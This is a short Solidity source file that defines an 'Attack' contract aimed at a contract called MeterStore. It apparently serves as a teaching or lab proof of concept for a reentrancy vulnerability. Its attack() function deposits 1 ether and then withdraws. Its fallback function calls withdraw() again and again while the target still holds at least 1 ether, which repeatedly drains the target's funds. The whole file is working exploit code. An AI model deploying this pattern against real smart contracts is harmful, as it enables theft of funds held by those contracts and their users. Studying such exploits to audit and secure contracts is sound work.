// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./MeterStore.sol";

contract Attack {
    MeterStore public meterStore;

    constructor(address _meterStoreAddress) {
      meterStore = MeterStore(_meterStoreAddress);
    }

    fallback() external payable {
      if (address(meterStore).balance >= 1 ether) {
        meterStore.withdraw();
      }
    }

    function attack() external payable {
      require(msg.value >= 1 ether);
      meterStore.deposit{value: 1 ether}();
      meterStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
      return address(this).balance;
    }
}